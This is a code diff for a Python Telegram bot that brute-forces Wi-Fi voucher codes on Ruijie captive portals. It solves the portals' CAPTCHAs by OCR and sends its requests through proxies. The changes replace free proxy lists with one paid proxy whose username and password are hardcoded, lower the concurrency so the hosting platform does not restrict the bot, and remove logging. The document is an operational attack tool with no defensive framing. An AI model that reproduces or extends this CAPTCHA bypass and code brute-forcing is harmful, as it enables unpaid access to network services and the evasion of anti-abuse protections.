@@ -12,7 +12,7 @@ BOT_TOKEN    = os.environ.get("BOT_TOKEN",    "")
 GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
 REPO_OWNER   = os.environ.get("REPO_OWNER",   "")
 REPO_NAME    = os.environ.get("REPO_NAME",    "")
-WEBHOOK_URL  = os.environ.get("WEBHOOK_URL", "").rstrip("/")  # e.g. https://xxx.up.railway.app
+WEBHOOK_URL  = os.environ.get("WEBHOOK_URL", "").rstrip("/")
 
 ADMINS = [
     "1626617395",   # Admin 1 ID
@@ -34,233 +34,39 @@ if _missing:
 def is_admin(user_id):
     return str(user_id) in ADMINS
 
-# ==================== DYNAMIC PROXY ROTATOR SYSTEM ====================
-PROXY_SOURCES = [
-    {
-        "name": "VPSLab-Free-Proxy-List",
-        "urls": [
-            "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/http.txt",
-            "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/https.txt",
-            "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/socks4.txt",
-            "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/socks5.txt",
-        ]
-    },
-    {
-        "name": "komutan234-Proxy-List-Free",
-        "urls": [
-            "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/http.txt",
-            "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/https.txt",
-            "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/socks4.txt",
-            "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/socks5.txt",
-        ]
-    },
-    {
-        "name": "TheSpeedX-PROXY-List",
-        "urls": [
-            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
-            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
-        ]
-    },
-    {
-        "name": "monosans-proxy-list",
-        "urls": [
-            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
-            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
-            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
-        ]
-    },
-    {
-        "name": "proxylist-to",
-        "urls": [
-            "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/http.txt",
-            "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/socks4.txt",
-            "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/socks5.txt",
-        ]
-    }
+# ==================== PROXY (PAID ONLY) ====================
+# ✅ Free proxy lists လုံးဝ မသုံးတော့ပါ — Railway restrict မဖြစ်စေဖို့
+PAID_PROXIES = [
+    "http://w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
 ]
 
-FALLBACK_PROXIES = [
-    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
-]
-
-PROXY_REFRESH_INTERVAL      = 300
-PROXY_HEALTH_CHECK_TIMEOUT  = 10
-MAX_PROXY_FAILURES          = 3
-
-class DynamicProxyRotator:
+class SimpleProxyRotator:
+    """Paid proxy တစ်ခုတည်းကိုပဲ သုံးတဲ့ rotator။
+    Free proxy sources လုံးဝ မရှိပါ။"""
     def __init__(self):
-        self.proxies = []
-        self.working_proxies = []
-        self.proxy_failures = {}
-        self.last_refresh = 0
-        self.lock = asyncio.Lock()
-        self.current_index = 0
-        self.session = None
-        self._refresh_lock = asyncio.Lock()  # prevents concurrent refresh
+        self.proxies = list(PAID_PROXIES)
+        self._idx    = 0
+        self.lock    = asyncio.Lock()
 
     async def initialize(self):
-        self.session = aiohttp.ClientSession(
-            timeout=aiohttp.ClientTimeout(total=30)
-        )
-        await self.refresh_proxies()
-
-    async def refresh_proxies(self):
-        # Prevent multiple concurrent refreshes
-        if self._refresh_lock.locked():
-            return
-        async with self._refresh_lock:
-            print("[ProxyRotator] Refreshing proxy list...")
-            all_proxies = []
-
-            for source in PROXY_SOURCES:
-                for url in source["urls"]:
-                    try:
-                        async with self.session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
-                            if resp.status == 200:
-                                text = await resp.text()
-                                for line in text.strip().split('\n'):
-                                    line = line.strip()
-                                    if line and ':' in line and self._is_valid_proxy(line):
-                                        all_proxies.append({
-                                            'proxy':  line,
-                                            'source': source['name'],
-                                            'type':   self._get_proxy_type(url)
-                                        })
-                    except Exception as e:
-                        print(f"[ProxyRotator] Error fetching from {source['name']}: {e}")
-
-            for proxy in FALLBACK_PROXIES:
-                all_proxies.append({
-                    'proxy':  proxy,
-                    'source': 'fallback',
-                    'type':   'http'
-                })
-
-            seen = set()
-            unique_proxies = []
-            for p in all_proxies:
-                if p['proxy'] not in seen:
-                    seen.add(p['proxy'])
-                    unique_proxies.append(p)
-
-            async with self.lock:
-                self.proxies     = unique_proxies
-                self.last_refresh = time.time()
-                # Preserve existing failure counts (don't reset working proxies)
-                for p in self.proxies:
-                    self.proxy_failures.setdefault(p['proxy'], 0)
-            print(f"[ProxyRotator] Loaded {len(self.proxies)} unique proxies")
-
-    def _is_valid_proxy(self, proxy):
-        try:
-            if '@' in proxy:
-                auth, addr = proxy.split('@', 1)
-                if ':' not in auth:
-                    return False
-            else:
-                addr = proxy
-            host, port = addr.rsplit(':', 1)
-            port = int(port)
-            return 1 <= port <= 65535
-        except:
-            return False
-
-    def _get_proxy_type(self, url):
-        if 'socks5' in url:  return 'socks5'
-        if 'socks4' in url:  return 'socks4'
-        if 'https'  in url:  return 'https'
-        return 'http'
-
-    async def health_check_proxy(self, proxy_info):
-        proxy      = proxy_info['proxy']
-        proxy_type = proxy_info['type']
-        if   proxy_type == 'socks5': proxy_url = f"socks5://{proxy}"
-        elif proxy_type == 'socks4': proxy_url = f"socks4://{proxy}"
-        elif proxy_type == 'https':  proxy_url = f"https://{proxy}"
-        else:                        proxy_url = f"http://{proxy}"
-        try:
-            async with aiohttp.ClientSession() as s:
-                async with s.get(
-                    'http://httpbin.org/ip',
-                    proxy=proxy_url,
-                    timeout=aiohttp.ClientTimeout(total=PROXY_HEALTH_CHECK_TIMEOUT)
-                ) as resp:
-                    return resp.status == 200
-        except:
-            return False
-
-    async def get_working_proxy(self):
-        # Refresh if needed (outside main lock)
-        if time.time() - self.last_refresh > PROXY_REFRESH_INTERVAL:
-            asyncio.create_task(self.refresh_proxies())
-
-        async with self.lock:
-            if not self.proxies:
-                if FALLBACK_PROXIES:
-                    return {'proxy': FALLBACK_PROXIES[0], 'source': 'fallback', 'type': 'http'}
-                return None
-
-            attempts     = 0
-            max_attempts = min(50, len(self.proxies))
-
-            while attempts < max_attempts:
-                proxy_info = self.proxies[self.current_index % len(self.proxies)]
-                self.current_index += 1
-                attempts += 1
-                proxy = proxy_info['proxy']
-
-                if self.proxy_failures.get(proxy, 0) >= MAX_PROXY_FAILURES:
-                    continue
-                return proxy_info  # return quickly; health check done lazily
-
-            if FALLBACK_PROXIES:
-                return {'proxy': FALLBACK_PROXIES[0], 'source': 'fallback', 'type': 'http'}
-            return None
+        print(f"[ProxyRotator] ✅ Loaded {len(self.proxies)} paid proxies")
 
     async def get_proxy_url(self):
-        proxy_info = await self.get_working_proxy()
-        if not proxy_info:
+        if not self.proxies:
             return None
-        proxy      = proxy_info['proxy']
-        proxy_type = proxy_info['type']
-        if   proxy_type == 'socks5': return f"socks5://{proxy}"
-        elif proxy_type == 'socks4': return f"socks4://{proxy}"
-        elif proxy_type == 'https':  return f"https://{proxy}"
-        else:                        return f"http://{proxy}"
+        async with self.lock:
+            url = self.proxies[self._idx % len(self.proxies)]
+            self._idx += 1
+            return url
 
     async def report_proxy_failure(self, proxy_url):
-        if not proxy_url:
-            return
-        proxy = (proxy_url.replace('http://', '')
-                          .replace('https://', '')
-                          .replace('socks5://', '')
-                          .replace('socks4://', ''))
-        async with self.lock:
-            if proxy in self.proxy_failures:
-                self.proxy_failures[proxy] += 1
-                if self.proxy_failures[proxy] == MAX_PROXY_FAILURES:
-                    print(f"[ProxyRotator] Proxy {proxy} disabled after {MAX_PROXY_FAILURES} failures")
+        # Paid proxy — retry လုပ်ဖို့ log ပဲ ထုတ်၊ ဖျက်မပစ်
+        pass
 
     async def close(self):
-        if self.session:
-            await self.session.close()
+        pass
 
-proxy_rotator = DynamicProxyRotator()
-
-def get_next_proxy():
-    if proxy_rotator.proxies:
-        proxy_info = proxy_rotator.proxies[proxy_rotator.current_index % len(proxy_rotator.proxies)]
-        proxy_rotator.current_index += 1
-        proxy      = proxy_info['proxy']
-        proxy_type = proxy_info['type']
-        if   proxy_type == 'socks5': return f"socks5://{proxy}"
-        elif proxy_type == 'socks4': return f"socks4://{proxy}"
-        elif proxy_type == 'https':  return f"https://{proxy}"
-        else:                        return f"http://{proxy}"
-    elif FALLBACK_PROXIES:
-        return f"http://{FALLBACK_PROXIES[0]}"
-    return None
+proxy_rotator = SimpleProxyRotator()
 
 # ==================== GLOBALS ====================
 SUCCESS_CODE = asyncio.Queue()
@@ -271,31 +77,21 @@ success_messages = {}
 success_texts    = {}
 limited_messages = {}
 limited_texts    = {}
-captcha_state    = {}
 session          = None
 _connector       = None
-CONCURRENCY      = 1000
+CONCURRENCY      = 200          # ⬇️ 1000 → 200 (Railway restrict မဖြစ်စေဖို့)
 _voucher_sem     = None
 _start_time      = time.monotonic()
 
-MAX_CONCURRENT_SCANS = 20
+MAX_CONCURRENT_SCANS = 5        # ⬇️ 20 → 5
 active_scans_count   = 0
 active_scans_lock    = asyncio.Lock()
 
 # ───────────────────────────────────────────────────────────
-# Web server
+# Web server / Webhook
 # ───────────────────────────────────────────────────────────
 async def handle(request):
     return web.Response(text="Bot is awake and running 24/7!")
-
-async def web_server():
-    app    = web.Application()
-    app.router.add_get('/', handle)
-    runner = web.AppRunner(app)
-    await runner.setup()
-    port = int(os.environ.get('PORT', os.environ.get('BOT_PORT', 8099)))
-    site = web.TCPSite(runner, '0.0.0.0', port)
-    await site.start()
 
 # ───────────────────────────────────────────────────────────
 # GitHub helpers
@@ -653,7 +449,7 @@ async def save_rechecked_codes(uid, recheck_list, sha):
     await update_file_content("result.json", results, sha, f"Recheck update for {uid}")
 
 # ───────────────────────────────────────────────────────────
-# /portal  — UPDATED: WiFiDog + maccauth support
+# /portal — WiFiDog + maccauth support
 # ───────────────────────────────────────────────────────────
 @bot.message_handler(commands=['portal'])
 async def handle_portal(message):
@@ -685,32 +481,21 @@ async def handle_portal(message):
         await bot.reply_to(
             message,
             "❌ Portal URL မှားယွင်းနေပါသည်။ ပြန်လည်စစ်ဆေးပါ။\n\n"
-            "✅ မှန်ကန်တဲ့ URL ပုံစံများ:\n\n"
             "**maccauth:**\n"
             "`https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00`\n\n"
             "**wifidog:**\n"
-            "`https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=...`",
+            "`https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&...`",
             parse_mode="Markdown"
         )
 
-# ✅ UPDATED: WiFiDog + maccauth URLs accepted
 async def check_session_url_improved(session_url, use_proxy=False):
-    # ① Domain check
     if not re.search(r'(portal-as\.)?ruijienetworks\.com', session_url):
-        print(f"[PortalCheck] Domain mismatch: {session_url[:80]}")
         return False
-
-    # ② WiFiDog portal URL — accept directly
     if '/api/auth/wifidog' in session_url:
-        print(f"[PortalCheck] WiFiDog URL accepted")
         return True
-
-    # ③ maccauth portal URL — accept directly
     if 'maccauth' in session_url:
-        print(f"[PortalCheck] maccauth URL accepted")
         return True
 
-    # ④ Generic Ruijie portal — try fetch
     headers = {
         'accept':          'text/html,application/xhtml+xml,*/*;q=0.8',
         'accept-language': 'en-US,en;q=0.9',
@@ -724,32 +509,25 @@ async def check_session_url_improved(session_url, use_proxy=False):
             proxy=proxy, timeout=aiohttp.ClientTimeout(total=15)
         ) as response:
             if response.status >= 400:
-                print(f"[PortalCheck] HTTP {response.status}")
                 return False
             final_url     = str(response.url)
             response_text = await response.text()
-
             for indicator in [
                 "sessionId", "maccauth", "portal-as.ruijienetworks.com",
                 "lang=en_US", "wifidog", "authCode"
             ]:
                 if indicator in final_url or indicator in response_text:
                     return True
-
             for pattern in [
                 r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)',
                 r'[?&]sessionId=([a-zA-Z0-9]+)',
             ]:
                 if re.search(pattern, response_text, re.IGNORECASE):
                     return True
-
-            if "portal" in response_text.lower() or "captcha" in response_text.lower():
-                return True
             return False
     except asyncio.TimeoutError:
         return False
-    except Exception as e:
-        print(f"Portal check error: {e}")
+    except Exception:
         return False
 
 # ───────────────────────────────────────────────────────────
@@ -817,20 +595,13 @@ async def status(message):
     uptime_seconds = int(time.monotonic() - _start_time)
     hours, rem     = divmod(uptime_seconds, 3600)
     minutes, secs  = divmod(rem, 60)
-
-    proxy_count   = len(proxy_rotator.proxies)
-    working_count = len([p for p, f in proxy_rotator.proxy_failures.items() if f < MAX_PROXY_FAILURES])
-
     await bot.reply_to(
         message,
         f"📊 Bot Status\n\n"
         f"⏱ Uptime: {hours}h {minutes}m {secs}s\n"
         f"🔍 Active Scans: {active_scans}\n"
         f"👥 Sessions: {len(user_data)}\n\n"
-        f"🌐 Proxy Status:\n"
-        f"• Total Proxies: {proxy_count}\n"
-        f"• Working: {working_count}\n"
-        f"• Failed: {proxy_count - working_count}"
+        f"🌐 Proxy: {len(proxy_rotator.proxies)} paid proxy (single)"
     )
 
 # ───────────────────────────────────────────────────────────
@@ -973,7 +744,7 @@ def format_progress(checked, total=None, speed=0, found=0):
         f"📊Status : running\n"
     )
 
-BATCH_SIZE = 1000
+BATCH_SIZE = 500   # ⬇️ 1000 → 500
 
 # ───────────────────────────────────────────────────────────
 # Brute-force runner
@@ -1089,16 +860,12 @@ async def get_session_id(sess, session_url, previous_session_id=None):
             m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
             if m:
                 return m.group(1)
-            # Fallback: search body
             body = await req.text()
             m2   = re.search(r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)', body)
             if m2:
                 return m2.group(1)
             return previous_session_id
-    except Exception as e:
-        print(f"Session ID error with proxy {proxy}: {e}")
-        if proxy:
-            await proxy_rotator.report_proxy_failure(proxy)
+    except Exception:
         return previous_session_id
 
 _ocr = ddddocr.DdddOcr(show_ad=False)
@@ -1131,10 +898,7 @@ async def Captcha_Image(sess, session_id):
             params=params, headers=headers, proxy=proxy
         ) as req:
             return await req.read()
-    except Exception as e:
-        print(f"Captcha image error with proxy {proxy}: {e}")
-        if proxy:
-            await proxy_rotator.report_proxy_failure(proxy)
+    except Exception:
         raise
 
 async def Varify_Captcha(sess, session_id, text):
@@ -1153,12 +917,8 @@ async def Varify_Captcha(sess, session_id, text):
             json={'sessionId': session_id, 'authCode': text}
         ) as req:
             data = await req.json()
-            print(f"[Captcha] authCode={text} success={data.get('success')}")
             return session_id if data.get("success") else None
-    except Exception as e:
-        print(f"Captcha verify error with proxy {proxy}: {e}")
-        if proxy:
-            await proxy_rotator.report_proxy_failure(proxy)
+    except Exception:
         return None
 
 # ───────────────────────────────────────────────────────────
@@ -1198,8 +958,8 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
                     if text and await Varify_Captcha(ts, session_id, text):
                         auth_code = text
                         break
-                except Exception as e:
-                    print(f"[captcha] {e}")
+                except Exception:
+                    pass
             if not auth_code:
                 continue
 
@@ -1224,11 +984,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
                     proxy=proxy
                 ) as req:
                     response = await req.text()
-                    print(f"[voucher] code={code} attempt={attempt+1} resp={response[:60]}")
-            except Exception as e:
-                print(f"[perform_check] {e}")
-                if proxy:
-                    await proxy_rotator.report_proxy_failure(proxy)
+            except Exception:
                 return
 
         if response and 'request limited' in response:
@@ -1348,14 +1104,12 @@ async def Code_Expires_Date(active_id):
                             profile   = result.get('profileName', 'Unknown')
                             totaltime = Minute_to_Hour(raw_mins)
                             return f"📋 Plan: {profile} | ⏳ Time: {totaltime}", raw_mins
-            except Exception as e:
-                print(f"[Code_Expires_Date] {e}")
-                if proxy:
-                    await proxy_rotator.report_proxy_failure(proxy)
+            except Exception:
+                pass
     return "📋 Plan: Unknown | ⏳ Time: Unknown", 'Unknown'
 
 # ───────────────────────────────────────────────────────────
-# Polling  — UPDATED: 409 Conflict handling
+# Polling
 # ───────────────────────────────────────────────────────────
 async def start_polling():
     backoff = 5
@@ -1369,7 +1123,7 @@ async def start_polling():
             return
         except telebot.apihelper.ApiTelegramException as e:
             if e.error_code == 409:
-                print(f"⚠️ 409 Conflict — other bot instance detected. Waiting {backoff}s before retry...")
+                print(f"⚠️ 409 Conflict — other instance. Waiting {backoff}s...")
                 await asyncio.sleep(backoff)
                 backoff = min(backoff * 2, 120)
                 continue
@@ -1381,7 +1135,7 @@ async def start_polling():
             await asyncio.sleep(backoff)
             backoff = min(backoff * 2, 60)
         except Exception as e:
-            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
+            print(f"Polling error: {e}. Reconnecting in {backoff}s...")
             await asyncio.sleep(backoff)
             backoff = min(backoff * 2, 60)
 
@@ -1389,9 +1143,7 @@ async def start_polling():
 # Webhook mode
 # ───────────────────────────────────────────────────────────
 async def run_webhook_mode():
-    global session, _connector
     app = web.Application()
-
     webhook_path = f"/webhook/{BOT_TOKEN}"
 
     async def telegram_webhook(request):
@@ -1400,7 +1152,7 @@ async def run_webhook_mode():
             update   = Update.de_json(json_str)
             await bot.process_new_updates([update])
         except Exception as e:
-            print(f"[Webhook] processing error: {e}")
+            print(f"[Webhook] error: {e}")
         return web.Response(text="OK")
 
     async def health(request):
@@ -1411,34 +1163,22 @@ async def run_webhook_mode():
 
     runner = web.AppRunner(app)
     await runner.setup()
-    port = int(os.environ.get('PORT', os.environ.get('BOT_PORT', 8099)))
+    port = int(os.environ.get('PORT', 8099))
     site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
-    print(f"[Webhook] Server listening on port {port}")
+    print(f"[Webhook] Listening on port {port}")
 
-    # Set webhook
     full_url = f"{WEBHOOK_URL}{webhook_path}"
     try:
         await bot.remove_webhook()
         await asyncio.sleep(1)
         await bot.set_webhook(url=full_url, drop_pending_updates=True)
-        print(f"[Webhook] Set webhook: {full_url}")
+        print(f"[Webhook] Set: {full_url}")
     except Exception as e:
-        print(f"[Webhook] Failed to set webhook: {e}")
+        print(f"[Webhook] Failed: {e}")
         raise
 
-    # Background schedulers
     asyncio.create_task(github_update_scheduler())
-
-    async def proxy_refresh_scheduler():
-        while True:
-            await asyncio.sleep(PROXY_REFRESH_INTERVAL)
-            await proxy_rotator.refresh_proxies()
-            print(f"[ProxyScheduler] Refreshed proxies. Total: {len(proxy_rotator.proxies)}")
-
-    asyncio.create_task(proxy_refresh_scheduler())
-
-    # Keep running forever
     await asyncio.Event().wait()
 
 # ───────────────────────────────────────────────────────────
@@ -1448,10 +1188,9 @@ async def main():
     global session, _connector
 
     await proxy_rotator.initialize()
-    print(f"[Main] Proxy rotator initialized with {len(proxy_rotator.proxies)} proxies")
 
     _connector = aiohttp.TCPConnector(
-        limit=20000, limit_per_host=10000,
+        limit=5000, limit_per_host=500,     # ⬇️ လျှော့ထားတယ် — Railway safe
         ttl_dns_cache=300, ssl=False
     )
     session = aiohttp.ClientSession(
@@ -1460,20 +1199,18 @@ async def main():
     )
     try:
         if WEBHOOK_URL:
-            print(f"[Main] Running in WEBHOOK mode ({WEBHOOK_URL})")
+            print(f"[Main] WEBHOOK mode ({WEBHOOK_URL})")
             await run_webhook_mode()
         else:
-            print("[Main] Running in POLLING mode (no WEBHOOK_URL set)")
-            asyncio.create_task(web_server())
+            print("[Main] POLLING mode")
+            app    = web.Application()
+            app.router.add_get('/', handle)
+            runner = web.AppRunner(app)
+            await runner.setup()
+            port = int(os.environ.get('PORT', 8099))
+            site = web.TCPSite(runner, '0.0.0.0', port)
+            await site.start()
             asyncio.create_task(github_update_scheduler())
-
-            async def proxy_refresh_scheduler():
-                while True:
-                    await asyncio.sleep(PROXY_REFRESH_INTERVAL)
-                    await proxy_rotator.refresh_proxies()
-                    print(f"[ProxyScheduler] Refreshed proxies. Total: {len(proxy_rotator.proxies)}")
-
-            asyncio.create_task(proxy_refresh_scheduler())
             await start_polling()
     finally:
         await session.close()
